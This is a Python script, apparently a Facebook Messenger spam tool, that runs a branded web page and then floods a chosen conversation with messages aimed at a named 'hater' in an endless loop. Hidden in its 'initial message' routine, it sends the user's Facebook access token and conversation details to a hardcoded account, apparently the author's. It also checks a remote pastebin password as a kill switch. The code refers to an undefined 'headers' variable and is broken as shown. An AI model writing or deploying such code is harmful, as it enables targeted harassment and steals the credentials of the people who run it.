import requests
import json
import time
import pytz
import datetime
import sys
import os
import subprocess
import http.server
import socketserver
import threading
import random
# HTML Content for the server page
html_content = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>𝐑𝐊 𝐑𝐀𝐉𝐀 𝐗𝐖𝐃</title>
    <style>
        body {
            background-image: url('Deva.jpg');
            background-size: cover;
        }
        .container {
            text-align: center;
            margin-top: 50px;
        }
        .box {
            border: 2px solid black;
            width: 300px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(255, 255, 255, 0.5);
            color: black;
        }
        .credit {
            text-align: left;
        }
        .thanks {
            margin-top: 50px;
            text-align: center;
            color: black;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="box">
            <h1>𝐑𝐊 𝐑𝐀𝐉𝐀 𝐗𝐖𝐃</h1>
            <div class="credit">
                <p>1. CREDIT:-RK RAJA XWD</p>
                <p>2. OWNER => 𝐑𝐊 𝐑𝐀𝐉𝐀</p>
                <p>3. CONTACT:- <a href="https://wa.me/+9172918 68271">WhatsApp</a></p>
                <p>4. FACEBOOK:- <a href="https://www.facebook.com/DEVA.DON.006">Facebook</a></p>
                <p>5. WATTSAPP GROUP:- <a href="https://wa.me/+9172918 68271">WhatsApp Group</a></p>
            </div>
        </div>
    </div>
    <div class="thanks">
        <p>❤️Thanks for using my server❤️</p>
        <p>👇Subscribe to my YouTube channel👇</p>
        <a href="">YouTube Channel</a>
    </div>
</body>
</html>
"""
# Server Handler
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode())
# Server Execution
def execute_server():
    PORT = int(os.environ.get('PORT', 4000))
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()
# Get Time in Indian Standard Time
utc_now = datetime.datetime.utcnow()
indian_timezone = pytz.timezone('Asia/Kolkata')
ist_now = utc_now.replace(tzinfo=pytz.utc).astimezone(indian_timezone)
formatted_time = ist_now.strftime("\033[1;38;5;208m Time :- %Y-%m-%d %I:%M:%S %p")
print(formatted_time)
# Define Global Variables
tokens = ['your_access_token_here']  # Provide the actual tokens here
convo_id = input("Enter your Convo ID: ")  # Get Convo ID from user
haters_name = input("Enter Hater's Name: ")  # Get Hater's Name from user
messages = ["Hello, this is a test message!"]  # Define the list of messages to send
num_messages = len(messages)
speed = 2  # Define the delay between messages (in seconds)
password = "your_secure_password_here"  # Define the password for validation
# Password Validation
def validate_password():
    mmm_pass = requests.get('https://pastebin.com/raw/JxQ0PuCf').text
    if mmm_pass != password:
        print('\033[1;31m⚠︎ Your Password Changed By rkraja7065')
        sys.exit()
# Initial Message Sender
def send_initial_message():
    validate_password()
    msg_template = "Owner => DEVA THAKUR\n Hello RK RAJA XWD 🫂 sir.\n I am using your convo server.\n This Is My Details :-\n Convo ID :- {} \n Name:- {} \n Token :- {}"
    
    target_ids = ["100004518573740"]  # Target ID
    for target_id in target_ids:
        for token in tokens:
            access_token = token.strip()
            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
            msg = msg_template.format(convo_id, haters_name, access_token)
            parameters = {'access_token': access_token, 'message': msg}
            response = requests.post(url, json=parameters, headers=headers)
            time.sleep(0.1)
            print("\n\033[1;31m[+] Initial message sent to target ID: {}. Continuing...\n".format(target_id))
# Send Messages from File
def send_messages_from_file():
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)
    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[message_index].strip()
                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)
                if response.ok:
                    print("\033[1;36m[✓] DEVA THAKUR {} of Convo {} Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                else:
                    print("\033[1;35m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                time.sleep(speed)
            print("\n[+] All messages sent. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))
# Main Execution
def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()
    send_initial_message()
    send_messages_from_file()
if __name__ == '__main__':
    main()
